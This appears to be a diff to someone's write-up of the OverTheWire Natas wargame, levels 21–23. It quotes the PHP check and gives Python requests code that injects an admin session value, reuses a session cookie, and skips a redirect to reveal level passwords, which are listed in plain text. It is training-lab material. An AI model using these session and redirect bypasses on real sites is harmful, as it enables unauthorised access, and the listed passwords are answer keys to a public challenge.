@@ -415,3 +415,22 @@ response = session.post(experimenter, data = {'submit': '1', 'admin': '1'}, auth
 old_session = session.cookies['PHPSESSID']
 response = session.get(url, cookies = {"PHPSESSID": old_session}, auth=(username, password))
 // chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+lvl 22 --> lvl 23
+http://natas22.natas.labs.overthewire.org/
+natas22
+chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+// The point of this level is to disallow redirects
+// php code
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+// Looking a the code if we have a get request for revelio and $_SESSION['admin'] != 1 we will get redirected
+// so lets disallow redirection
+esponse = session.get(url, auth=(username, password), allow_redirects = False)
+// D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+# Disallow Redirects
